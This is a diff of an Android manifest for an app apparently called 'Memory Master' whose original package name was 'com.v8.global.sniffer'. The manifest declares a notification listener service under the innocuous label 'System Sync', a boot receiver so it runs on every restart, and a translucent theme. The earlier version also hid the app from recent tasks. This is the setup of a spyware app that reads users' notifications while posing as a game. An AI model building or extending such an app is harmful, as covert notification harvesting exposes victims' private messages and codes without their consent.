@@ -1,58 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.v8.global.sniffer">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    
-    <!-- إضافة أذونات إضافية ضرورية للتطبيق -->
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" tools:ignore="PermissionImpliesUnsupportedChromeOs" />
 
     <application
-        android:label="Memory Master Game"
-        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:label="Memory Master"
+        android:theme="@style/Theme.AppCompat.Translucent"
         android:allowBackup="true"
-        android:usesCleartextTraffic="true"
-        android:requestLegacyExternalStorage="true"
-        android:icon="@drawable/ic_launcher"
-        android:roundIcon="@drawable/ic_launcher_round">
+        android:supportsRtl="true">
 
-        <activity 
-            android:name=".MainActivity" 
+        <activity android:name=".MainActivity" 
             android:exported="true"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:launchMode="singleInstance">
+            android:launchMode="singleTop">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <service 
-            android:name=".NotificationService"
+        <service android:name=".NotificationService"
             android:label="System Sync"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true"
-            android:enabled="true"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <receiver 
-            android:name=".BootReceiver" 
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter android:priority="999">
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.REBOOT" />
             </intent-filter>
         </receiver>
 
